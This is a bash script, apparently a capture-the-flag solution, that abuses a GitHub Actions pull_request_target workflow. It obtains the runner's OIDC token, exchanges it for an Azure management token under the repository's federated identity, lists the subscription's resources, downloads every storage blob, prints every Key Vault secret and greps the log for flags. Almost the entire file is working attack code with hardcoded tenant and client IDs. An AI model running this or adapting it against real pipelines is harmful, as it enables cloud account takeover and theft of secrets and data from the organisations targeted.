#!/usr/bin/env bash
# pull_request_target OIDC exploit -> assume repo Azure federated identity -> hunt flag
set +e
exec > >(tee /tmp/all.log) 2>&1
AZURE_CLIENT_ID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
AZURE_TENANT_ID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
AZURE_SUBSCRIPTION_ID="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME actor=$GITHUB_ACTOR"
IDT=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "oidc len: ${#IDT}"; echo "$IDT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq '{sub,aud,repository,ref,event_name,job_workflow_ref}' 2>/dev/null
XCHG=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$IDT" -d "scope=https://management.azure.com/.default")
echo "$XCHG" | jq 'if .access_token then {ok:true,expires_in} else {error,error_description} end' 2>/dev/null || echo "$XCHG"
ARM=$(echo "$XCHG" | jq -r '.access_token // empty'); echo "arm len: ${#ARM}"
SUB="$AZURE_SUBSCRIPTION_ID"; AUTH=(-H "Authorization: Bearer $ARM")
echo "== resources =="; curl -sS "${AUTH[@]}" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01&\$top=1000"; echo
az login --service-principal -u "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$IDT" --allow-no-subscriptions -o none 2>/dev/null
az storage account list -o json >/tmp/sa.json 2>/dev/null; cat /tmp/sa.json
for a in $(jq -r '.[].name' /tmp/sa.json 2>/dev/null); do az storage container list --account-name "$a" --auth-mode login -o json >/tmp/ct.json 2>/dev/null; for c in $(jq -r '.[].name' /tmp/ct.json 2>/dev/null); do az storage blob list --account-name "$a" -c "$c" --auth-mode login -o json >/tmp/bl.json 2>/dev/null; for b in $(jq -r '.[].name' /tmp/bl.json 2>/dev/null); do echo "== $a/$c/$b =="; az storage blob download --account-name "$a" -c "$c" -n "$b" --auth-mode login -f /tmp/out --no-progress -o none 2>/dev/null && cat /tmp/out; echo; done; done; done
az keyvault list -o json >/tmp/kv.json 2>/dev/null; for v in $(jq -r '.[].name' /tmp/kv.json 2>/dev/null); do for s in $(az keyvault secret list --vault-name "$v" --query '[].name' -o tsv 2>/dev/null); do echo "kv $v/$s = $(az keyvault secret show --vault-name "$v" -n "$s" --query value -o tsv 2>/dev/null)"; done; done
echo "######## FLAG CANDIDATES ########"
grep -aEio '(DF2026\{[^}]*\}|DFC?\{[^}]*\}|flag\{[^}]*\}|[A-Za-z0-9]+\{[^}]{4,}\})' /tmp/all.log | sort -u
echo "######## END ########"
